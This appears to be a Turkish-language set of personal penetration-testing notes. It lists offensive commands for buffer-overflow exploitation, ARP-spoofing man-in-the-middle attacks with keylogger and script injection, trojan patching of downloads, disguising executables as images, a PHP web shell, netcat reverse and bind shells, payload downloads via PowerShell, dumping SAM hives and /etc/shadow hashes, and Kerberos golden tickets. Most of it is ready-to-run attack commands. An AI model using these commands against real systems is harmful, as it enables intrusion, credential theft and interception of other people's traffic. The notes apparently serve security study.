## BUFFER OVERFLOW

    1.	Hedefe fazla veri göndererek çökertebiliyormuyuz dene.(pattern_create ile)
    2.	Pattern offset ile kaçıncı değerde çöktüğünü bul.
    3.	EIP veri yazabiliyormuyuz dene.
    4.	Immunity Debugger’da Mona.py aracıyla uygulamada Ram koruması olmayan yerleri bul
    !mona modules (Hepsi FALSE olan yerler)
    5.	JMP ESP(FFE4)  komutunun geçtiği yerleri bul.
    !mona –find –s “\xff\xe4” –m örnek.dll (hepsi false olan bir dll)
    6.	Processin Hex değeri bizim EIP’ye yazacağımız değer olacak.
    7.	Shell kod ile EIP değeri arasına noop kodu yazılır, es vermek için. “\x90” * 50 örnek
    8.	Hepsini bir değişkene ata ve karşı tarafa socket ile komutu gönder

### generic_send_tcp
    Hedefe otomatik veri gönderip crash ettirmeye yarayan uygulama.
    Kullanımı =    “generic_send_tcp host port spike_script 0 0”
    Spike_scriptler =   usr/share/spike/audits
### Pattern
    Usr/share/metasploit-framework/tools/exploit
    “pattern_create.rb -l 3000”  =>  3000 karakterlik benzersiz kod oluşturur.
    “pattern_offset.rb -l 3000 –q EIPdeki değer” =>  Kodun kaçıncı karakterine denk gelen sayıyı verir.
    nasm_shell.rb =>  Girilen kodun hex değerini verir.


LINUX TEMEL KOMUTLAR

cp		=	Kopyalama
rm		=	Dosya silme
rm -rf		=	Klasör silme
cp -rf		=	Klasör kopyalama
grep		=	İçeriği filtreleyerek getirme
ls -a		=	Gizli klasörleri görme
ls -al		=	Gizli klasörleri listeli görme
ls -ln		=	İzinleri görme
ln -s		=	“ln -s /root/dosya_adı  /root/yeni_yolu”  -> Kısayol oluşturma
tracert, pathping  =   Hop atlama
history		=	Önceden girilen komutları getirir.
cat		=	Metin belgesi içindekileri okuma
man		=	“man program_adı” -> Bir programın nasıl kullanıldığını gösterir.
ps		=	Çalışan prosesler
kill		=	kill -9 PID  -> Çalışan 9 numaralı prosesi sonlandırır.
htop		=	İşlemci tüketimini gösterir.
more		=	Terminal ekranına belirli miktarda çıktı gösterir.
uniq		=	Aynı olan kelimeleri teke düşürür.
sort		=	Harf sıralamasına göre düzenler
halt		=	Ekranı kilitler, geri dönüşü olmaz
tail -f log_dosyası	=	Dosyanın sonunu getirir ve günceller.
locate 		=	Aranan dosyanın yolunu bulma.  updatedb ile güncellemen gerekir.
find		=	Aranan dizin ya da dosya bulma 
find  /etc -type f -name “*.py” -perm -u+x -mtime -5 | xargs ls -ls
find . 		= Bulunduğu dizin altını arar.
name 		= Tırnak içine aranacak dosya yazılır.
type 		= Dosya tipi. f dosya , d dizin
perm 		= İzin Yetkileri. Örnekte kullanıcının çalıştırılabilir dosya yetkileri
mtime 		= Gün cinsinden değer. Örnekte son 5 gün
atime 		= Dakika cinsinden değer.
size 		= veri boyutuna göre bulma  -size -10M (10megabayt tan küçük olanlar)
find . | wc -l  	= Kaç satır bulduğunu gösterir.
Gzip	= dosya sıkıştırır
gunzip	= sıkıştırılmış klasörü çıkarır.

grep / awk
ifconfig | grep -i “ether” | awk ‘{print $2}’	->	mac adresini ekrana bastırdık
i = ignore . Büyük küçük harfe duyarlı olma.
v = Belirtilen kelimenin geçtiği satırları getirme
c = Kelimeden kaç tane geçtiğini gösterir.
sort -n = dosya içeriğini sıraya göre getirir.

fdisk, df	=	Disk durumunu görme
fdisk -l		=	Disk bölümlerini görme
free		=	Ram durumunu görme
top, vmstat	=	Cpu durumunu görme
id		=	Yetkileri görme
getprivs	=	Meterpreter ekranında yetkileri görme
whoami	=	Hangi kullanıcı olduğumuzu görme
uname -a	=	İşletim sistemi	, versiyon, kernel bilgisi alma
lsb_release -a =	Dağıtım adını öğrenme
lshw		=	Donanım hakkında bilgi alma
dmidecode --type [bios]  =  Sistem hakkında bilgi alma

Linux ip verme 		=	ifconfig eth0 10.0.0.10
İp adresini öğrenme		=	curl icanhazip.com, curl ifconfig.me
Gateway, mask verme	=	route add default gw 10.0.0.1 netmask 255.0.0.0 eth0
Gateway adresini öğrenme	=	netstat -rn , route -n
Portu kullanan servisler	=	lsof -i :80  (80 portunu kullanan processleri getirir.
Ağ servisini yeniden başlatma	=	systemctl restart NetworkManager.services
Web server açma			=	service apache2 start    var/www/html dizini
Arp tablosunu görme			=	arp ,  arp -a
Dns ip öğrenme			=	cat /etc/resolv.conf
Dns ip değiştirme			=	nano /etc/dhcp/dhclient.conf
						#prepend domain-name-servers 127.0.0.1;	 ->								#işaretini kaldır,   127.0.0.1 yerine yeni dns leri gir.
Kullanıcı ekleme		=	adduser, useradd
Kullanıcı silme			=	deluser, userdel
Parola oluşturma		=	passwd kullanıcı_adı
Yetkilendirme			=	chmod +777 dosya_adı
Kullanıcıları görme		=	cat /etc/passwd
Parolaları görme		=	cat /etc/shadow	cat /etc/shadow | grep “root:”
En yüksek yetkili kullanıcıyı görme	=	cat /etc/passwd | grep “x:0”
Parola özetini görme	=	cat /etc/shadow | grep “root:” | cut -d “$” -f4 | cut -d “:” -f1
Silinmiş kullanıcıları görme	= cat /var/log/secure | grep userdel
***   /var/log/secure => Oluşturulmuş ve silinmiş kullanıcıların loglarını tutar.
Sistemin şifreleme algoritmasını bulma	=	authconfig --test | grep hashing
En son ssh bağlantısı yapılan yeri görme	= home/kullanıcı ad/.ssh/known_hosts dosyasında yazar.
Ssh hatası verirse		=       ssh -oHdstKeyAlgorithms=+ssh-dss root@192.168.1.24
apt update			=	Paketlerin yüklendiği veri tabanını günceller
apt upgrade			=	Sistemdeki tüm programları günceller
apt install paket_adı 	 	=	Program yükleme
apt remove paket_adı		=	Program silme
Patch Yolu Gösterme		=	export PATH=$PATH:/dosya/dosya
sudo -l				=	sudo yetkilerini görme (sudoers.d dosyasını okur)
cat /etc/crontab		=	Zamanlanmış görevleri göster.
Klavye dilini kalıcı değiştirme =      nano /etc/default/keyboard -> XKBLAYOUT="tr"


WINDOWS TEMEL KOMUTLAR

Yerel kullanıcı ekleme		=	net user (kullanıcı adı) (parola) /add
Domain kullanıcısı ekleme	=	net user (kullanıcı adı) (parola) /DOMAIN
Kullanıcı silme			=	net user (kullanıcı adı) /del
Domain grubuna Admin yetkili 	=	net group “domain admins” (kullanıcı adı) /add /DOMAIN
kullanıcı ekleme
Kullanıcı ayrıntılarını görme	=	net user (kullanıcı adı)
Kullanıcıları görme		=	wmic useraccount get sid, name  //sadece admin kullanıcısını görmek
      					için komutun sonuna “ | findstr /L 500” yaz	

İp adresini öğrenme		=	curl icanhazip.com
Gateway adresini öğrenme	=	netstat -rn

ver				=	İşletim sistemi versiyonunu gösterir.
whoami /priv			=	Kullanıcının yetkilerini gösterir.
Görev zamanlayıcı oluşturma
SCHTASKS /Create /SC WEEKLY /D MON /TN cmd /TR c:\windows\system32\cmd.exe
Haftanın Pazartesi günleri cmd.exe komutunu çalıştır.
Powershell Üzerinden Log İnceleme
Get-EventLog -LogName System -Index <Index_no> 

VPN :
* Mozilla Firefox tarayıcıda Vpn kullanımı için web tarayıcı adres kısmına “about:config” gir.
“media.peerconnection.enable” -> false yap.  (Gerçek ip adresinin vpn kullanımında bazı yerlerde geçmesini engeller.)
Vpnbook ‘a gir. Openvpn sekmesinden indirilen vpn dosyasını “unzip” ile çıkar. “openvpn açılacakportadı.ovpn” (Yükleme yaparken tarayıcı pencereleri kapat)
* Opera tarayıcı içinde Vpn var.
*** www.dnsleaktest.com -> Hangi ülke ip’sinde olduğunu görme. Gerçek ip mizi bulunabilir mi test eder.
TOR Browser :
Kaliye Tor Kurma;
 “apt-get install tor -y”
“apt-get install proxychains”
leafpad /etc/proxychains.conf
	#dynamic_chain	//# işaretini sil
	#strict_chain		//# işareti ekle
	En alttaki socks4 -> socks5 yap. Kaydet
Tarayıcıda : proxy ayarları -> manuel ayarları seç. socks host : 127.0.0.1  port: 9050 gir
Tor ağını başlat	=>	“service tor start”
**Siteden girilen ip adresi değişti. Komut satırında ise hala eski ip mevcut. Onunda değişmesi için;
“proxychains curl icanhazip.com”	=> Yazacağın her komutun başına proxychains yaz, ip gizlenir.

MITM (Man in the Middle Framework):
Yüklemek için 	->	“apt-get install mitmf”
“mitmf --arp --spoof --gateway modem_ip --target hedef_ip -i eth0”
Güvenli Https isteklerini Http olarak açtırır. Hsts kullanan sitelerde çalışmaz. (Hsts: Adres satırına elle http girsen bile seni https sayfasına atar. Facebook ve gmail hsts kullanıyor)
MITM DNS
Sahte Dns adreslerine yönlendirme yapar.İstediğimiz ip adresine yönlendiririz.
“leafpad /etc/mitmfmitmf.conf” -> Açılan dosyada [[[A]]] yazan yer girilen sitenin yönlendirildiği ip nin yazıldığı yer. (*.hotmail.com = 192.168.1.1)
Yönlendirmeyi başlatma :
“mitmf --arp --spoof --gateway modem_ip --target hedef_ip -i eth0 --dns”

Ekran Görüntüsü Alma:
“mitmf --arp --spoof --gateway modem_ip --target hedef_ip -i eth0 --screen --interval 20” (20 saniye)
Görüntülerin kaydedildiği yer : /var/log/mitmf
Hata verirse : “pip install Twisted=15.5.0”
Klavye Tuşlarını Takip Etmek:
“mitmf --arp --spoof --gateway modem_ip --target hedef_ip -i eth0 --jskeylogger”
Java Script Kodlarını Çalıştırmak:
“mitmf --arp --spoof --gateway modem_ip --target hedef_ip -i eth0 --inject --js-payload “alert(‘...’);”

BDF (Backdoor Factory) Proxy:
Hedef birşey indirmek istediğinde biz trojanımızı o dosyanın içine yamalıyoruz. Bunun için;
1-	Aynı ağda olmak
2-	Man in the middle olmak
3-	BDF Proxy ayarlarını yapmak gerekir.

“leafpad /etc/bdfproxy/ bdfproxy.cfg”
1-	proxy mode = transparent
2-	Hedef işletim sistemi neyse ordaki host ip yerine kendi ip mizi yazıyoruz.
“ip tables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080”
(80’den gelen bağlantıyı 8080’e yönlendir)
“bdfproxy” yaz. Saldırıyı başlat.
MITM saldırısını başlat. Dinleme modu için;
“msfconsole -r /usr/share/bdfproxy/.... .rc (bdfproxy nin dinlediği dosya yolu)
SSL Strip Çalıştırma (Https’i Http’ye Çevirme)
“ip tables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000”

“sslstrip”
Ettercap çalıştırma:
“ettercap -Tq -M arp:remote -S -i wlan0 /192.168.1.1//  /192.168.1.15//”
// -S -> sslstrip kendimiz yaptığımız için S koymalıyız.
Virüslü Dosyayı Görsel Dosya İle Birleştirme:

Shellter
İki farklı dosyayı birleştirmeye yarar. POST EXPLOİTATİON (İSTİSMAR SONRASI) bölümünde var.
Fake Image Exploiter
Github’dan indir
1-	Setting dosyası ayarlarını değiştirme;
a.	Leafpad ile aç.
i.	picture extension : jpeg (resim formatını gir)
ii.	payload extension : exe (trojan formatını gir)
2-	“bash FakeImageExploiter.sh” -> Programı çalıştır.
3-	exe dosyayı göster -> jpeg dosyayı göster -> icon seç -> isim gir -> ip gir -> port gir -> metot gir
Daha inandırıcı olması için herhangi bir programla icon resmini değiştirebiliriz.
Uzantısını değiştirebiliriz;
Dosya adını kopyala, not defterine yaz. Karakter işlemden sağdan sola methodunu seç. Dosya adını yeniden oluştur.

SİTE ZAFİYETLERİ

Brute Force (Kaba Kuvvet) Saldırısı
Kullanıcı adı ve parola girilen yerlerde belli bir kısıtlama yoksa sürekli deneme yaparak (wordlist aracılığıyla) kullanıcı adı ve parolayı tespit etmeye yarar. Örnek program “Hydra”
Command Injection (Komut Enjeksiyonu)
Bir web uygulaması üzerinde uzaktan kod çalıştırabilme. Text yazılan kısma özel karakter (&&) girdikten sonra yazılan komutlar, komut satırında yazılıyormuş gibi davranır.
CSRF (Siteler Arası İstek Sahtekârlığı) Zafiyeti 
Giriş panellerinde oluşan açıktır. Girilen kullanıcı adı ve parola değiştirildiğinde adres satırında girilen değerler yazar. Adres satırından şifreler değişebilir.
File Inclusion Zafiyeti
Bulunduğu sistemdeki dosyaları okumaya yarayan araçtır. (etc/passwd dosyasını)
File Upload Zafiyeti
Siteye zararlı bir dosya upload ederek ele geçirmek. (Örnek siteye shell atılması)
php shell atma :  pentestmonkey sitesinden php reverse shell indir. ip ve port değiştir.
cmd shell örneği :   <?php system ($_GET[‘cmd’]);?>
Sql Injection Zafiyeti
“ ’ ” tırnak işareti konduğunda syntax hatası veriyorsa sql açığı olduğunu anlarız.
Sql Injection (Blind)
Sql Injection açığından farkı; açık olduğu web sitesine yansıtılmaz yani hata kodu görülmez.
XSS Reflected Zafiyeti
Yazı yazılabilen bir alanda bu zafiyet olabilir. Reflected zafiyetinde yazılan kodlar sadece bizi etkiler, siteye kaydedilmez.
XSS Stored Zafiyeti
Yapılan işler veri tabanına kaydedilir. Bütün giriş yapan kullanıcılar etkilenir. Html, javascript kodları çalışır.
PYTHON
Python dilinde kod yazma :	#!/usr/bin/env python
Türkçe karakter desteği :	# -*- coding: utf-8 -*-
base64 decoder :	for word in $(cat şifre.txt);do echo $word | base64 --decode >> çıktı.txt; done
Komut satırında çalışmak için :
import os  	 //Komut satırında çalışmak için os ekledik
os.system(“apt-get install figlet”)	//figlet büyük yazı yazdırma aracı
os.system(“clear”)
os.system(“figlet mac değiştirme”)
Ekrana yazı yazdırmak :	print(“””üç tırnak arasına ekranda görmek istediğini yaz”””)
Seçenekler arasından seçim yapmak :
islemno = raw_input (“İşlem no girin”)
if (islemno==”1”):
hedef ip =raw_input(“hedef ip girin:”)
os.system(”nmap” + hedef ip)
elif (islemno==”2”):
hedef ip =raw_input(“hedef ip girin:”)
os.system(”nmap -sS -sV” + hedef ip)
else: print(“hatalı seçim”)

CTRL + K + C	=	Toplu yorum satırına alma
CTRL + K + U	=	Toplu yorum satırını kaldırma

Scapy

ARP Poison
ARP Request paketi	=  scapy.ARP(op=1) (Default)
ARP Response paketi	=  
degisken = scapy.ARP(op=2,pdst=hedef ip, hwdst=hedef mac, psrc= modem ip gir)
scapy.send(degisken)  :  Paketi gönderir.
hwdst	= Hedef mac adresi
pdst	= Hedef ip adresi
psrc	= Kaynak ip adresi
hwsrc	= Kaynak mac adresi

Python Kodunu Exe Yapma

"C:\Users\TR\AppData\Local\Programs\Python\Python310\Scripts\pyinstaller.exe" MyPackage.py --onefile --add-data "C:\Users\TR\Desktop\adobe.pdf;." --noconsole --icon C:\Users\TR\Desktop\pdf.ico

BIND SHELL , REVERSE SHELL

BIND SHELL
Hedef üzerinde komut çalıştırılır. Gelen istekleri onaylayacak port açar. Biz hedefteki açılan porta istek göndeririz. Hedef isteği kabul eder.
Örnek;
Saldırgan makine	: nc -vvn hedef ip port
Hedef makine		:nc.exe -lvp port -e cmd.exe  //Önceden dosyanın o pc de olması gerekir
REVERSE SHELL
Hedef üzerinde komut çalıştırılır. Hedeften bize bağlantı isteği gelir. Biz dinleme modunda bekleriz ve gelen isteği kabul ederiz.
Örnek;
Saldırgan makine	: nc -lvp port
Hedef makine		:nc.exe -vvn saldırgan_ip port -e cmd.exe  //Bağlantıdan sonra cmd.exe çalışır.
***Düzgün bir shell almak için;
python -c ‘import pty;pty.spawn(“/bin/bash”)’

Uzaktan Bağlantı Kurmak (Windows)
winexe
winexe --user=Administrator%Parola ||hedef ip “cmd”    //Hedef komut satırına ulaşma
psexec

NETCAT
Sistemler arası iletişim kurmayı sağlar.
Netcat ile TCP port tarama:
nc -nvv -z 192.168.1.100 1-50  //port aralığını tarar.
Netcat ile shell alma:
1. Dinleme için	=>	nc -lvp 4444
2. Komut	=>	nc -e /bin/sh kendi ipmiz 4444
	
NETSTAT
Bilgisayarın gelen ve giden bağlantılarını, bu bağlantılara neden olan programları, pid numaralarını veren bir komuttur.
cmd =>  “netstat -anob”	daha detaylı =>  “netstat -anobf”
Kapatmak istediğin pid no varsa;
cmd => “taskkill /F /PID 2715”
Görev yöneticisinde çalışan programları komut satırında görmek için;
cmd =>	“tasklist”  yada  “tasklist /fi “PID EQ 2715”   //sadece o pıd numarasında çalışanı getirir
Hangi portların dinlendiğini görme;
cmd =>	“netstat -antp”
a:	all
t:	tcp bağlantıları getirir
u:	udp bağlantıları getirir
p:	pid hangi uygulamayı kullanıyor

STEGANOGRAFI
steghide
Resim içine veri saklama, içindeki veriyi okuma yada dışarı çıkarmaya yarar.
Veri saklamak için;
steghide --embed -ef (saklanacak veri) -cf (içine gömülecek dosya) -p (parola) -sf (oluşturulacak dosya adı) -e (şifreleme metodu) -z (sıkıştırma derecesi) -v (verbose)
Kontrol için;
steghide --info (kontrol edilecek dosya) -p (parola)
Veriyi açmak için;
steghide --extract -sf (şifrelenmiş dosya) -p (parola) -xf (oluşturulacak dosya adı)
Open Stego
Java destekli ortamlarda çalışır
Invisible Secret 4
Puffer 4.04
Xiao Steganography 2.61
S-Tools

Damgalama (Watermarking)
Bir dosyanın telif hakkını sağlayabilmek için o dosyanın içine gömme işlemine watermarking denir.
binwalk
Bir dosya içinde gömülü başka dosya olup olmadığını görürüz.

Hedef Sisteme Dosya Atma
wget
“wget dosya yolu url adresi”

scp
“scp dosya yolu  kullanıcı adı@hedef ip:/tmp/”
Örnek:	scp /var/www/html/evil.sh  msfadmin@192.168.1.10:/tmp/

netcat
Hedefte netcat yüklüyse;
“nc -lvp 4444 >evil.sh.2”	=> Hedefte dinlemeye aldık. Gelen dosyayı evil.sh.2 olarak kaydet.
kendi pc mizde;
“nc 192.168.1.12 4444 <evil.sh

powershell
1.	Apache servisi çalışıyor olacak
2.	İlgili dosya apache dizininde olacak
“powershell.exe (New-Object System.Net.WebClient).Download.File(‘http://ip_adresi/evil.exe’,’C:\Users\Default\evil.exe’)”

Bilgisayar Açıkken SAM ve SYSTEM Dosyalarını Elde Etmek

reg save hklm\SAM sam
reg save hklm\SYSTEM system

Load Balance Detector
Kali üzerinde “lbd” aracı ile hedefte yük dengeleyici olup olmadığını tespit ederiz. Özellikle Ddos saldırılarındaki yükü dengelemek için kullanılan bir güvenlik sistemidir.
“lbd site adı”

Mobil (Android) Güvenliği

Kullanılan araçlar = apktool , jadx (apk yada ipa uzantılı dosyaların içeriğindeki kodları okumaya yarar.
AndrodBugs = otomatik analizler gerçekleştirir, uygulamanın kullandığı güvenlik önlemlerini gösterir.
Sanal Android Uygulama = Android studio , Genymotion, Android x86 ( Fiziksel cihaz yerine sanal android oluşturma)
Taşınabilir Android Pentest Aracı = Appie (Windows)
Yapman gereken işlemler

1	Apk kurmadan önce nelere karşı önlem alınmış onları bilmek gerekir.
2	Normal kullanıcı gibi apk yı yükle ve nasıl çalıştığını anlamak için kurcala.
3	Uygulamanın yaptığı işlemleri izlemek için wireshake ve burp aracı ile network ve veri trafiği izlenebilir.
4	Depolama alanları ve uygulama loglarının incelenmesi


FTP 
 Wireshark ile FTP üzerinden aktarılan verinin dışarıya kayıt edilebilmesi için,
•	ftp-data filtresinden faydalanabilirsiniz.
•	RAW olarak kayıt etmeniz gerekmektedir.
Adb Shell ile telefona bağlantı yapılabilir.

OSINT
Web Sayfa Kaynak Kod Analizi
Arama terimi	Açıklama
<!--	Yorumlar
@	e-mail adresleri
ca-pub	Google Yayıncı Kimliği
ua-	Google AdSense Kimliği
.jpg	Ayrıca diğer resim dosyası uzantılarını deneyin


Veritabanı
Sqlite
Veritabanı dosyasına bağlanma =  Sqlite3 database_adı
Tablo bilgilerini görme		= PRAGMA table_info(tablo adı)
Verileri getirme			= SELECT * FROM tablo adı

GOLDEN TICKET
Kerberos golden ticket oluşturma
run post/Windows/escalate/golden_ticket 
“golden_ticket_create -h”
-d = domain tam adı
-g = grup yetki numaraları
-i = grup kullanıcı id si
-k = ntlm hashi kerberos
-s = domain sid değeri
-u = kullanıcı adı
-t = nereye kaydedileceği
Sid bulma = wmic useraccount get name, sid
Kerberos_ticket_use	/ ticket yolu
Kerberos_ticket_list
